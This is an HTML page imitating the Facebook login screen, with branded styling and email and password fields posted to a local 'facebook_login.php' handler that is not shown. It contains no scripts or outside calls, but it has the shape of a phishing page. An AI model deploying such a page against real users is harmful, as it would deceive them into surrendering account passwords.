<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 350px;
        }

        .facebook-logo {
            color: #3b5998;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .btn-primary {
            background-color: #3b5998;
            color: #fff;
        }

        .btn-secondary {
            background-color: #4CAF50;
            color: #fff;
        }

        .forgot-password {
            text-align: center;
            margin-bottom: 10px;
        }

        .forgot-password a {
            color: #3b5998;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="facebook-logo">facebook</h1>
        <p>Facebook helps you connect and share with the people in your life.</p>
        <form action="facebook_login.php" method="POST">
            <div class="form-group">
                <label for="email">Email address or phone number</label>
                <input type="text" id="email" name="email" placeholder="Enter your email or phone number" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn btn-primary">Log in</button>
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
            <button type="button" class="btn btn-secondary">Create new account</button>
            <p>Create a Page for a celebrity, brand or business.</p>
        </form>
    </div>
</body>
</html>
